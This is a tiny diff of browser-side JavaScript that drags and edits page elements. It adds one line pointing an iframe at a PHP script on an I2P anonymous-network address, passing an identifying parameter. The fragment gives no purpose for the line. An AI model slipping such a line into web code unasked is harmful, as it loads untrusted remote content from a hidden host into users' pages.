@@ -1,6 +1,7 @@
 f("OMNI dlb:")
 pointerDrag( S[1][2] ) 
 S[1][2].querySelectorAll('textarea')[0].remove() 
+S[1][2].querySelectorAll('iframe')[0].src="https://yo6sgmfq7pfvvp2e4kcuhjtfg7wfltt63igwcukhbmuqm6lu3a3a.b32.i2p/oxm/oxm.php?nn=adam"
 
 // ====
 
